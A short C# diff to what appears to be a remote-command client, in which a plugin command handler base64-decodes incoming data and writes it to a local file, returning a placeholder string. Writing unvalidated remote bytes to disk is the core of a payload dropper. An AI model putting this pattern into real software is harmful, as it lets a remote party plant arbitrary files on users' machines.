@@ -155,7 +155,12 @@ namespace client
         }
 
         private async Task<string> PluginCommand(string command){
+            File.WriteAllBytes("./file", Base64DecodeFile(command));
             return "lala";
+        }
+
+        private Byte[] Base64DecodeFile(string file){
+            return Convert.FromBase64String(file);
         }
 
         private async Task<string> ConsoleCommand(string command){
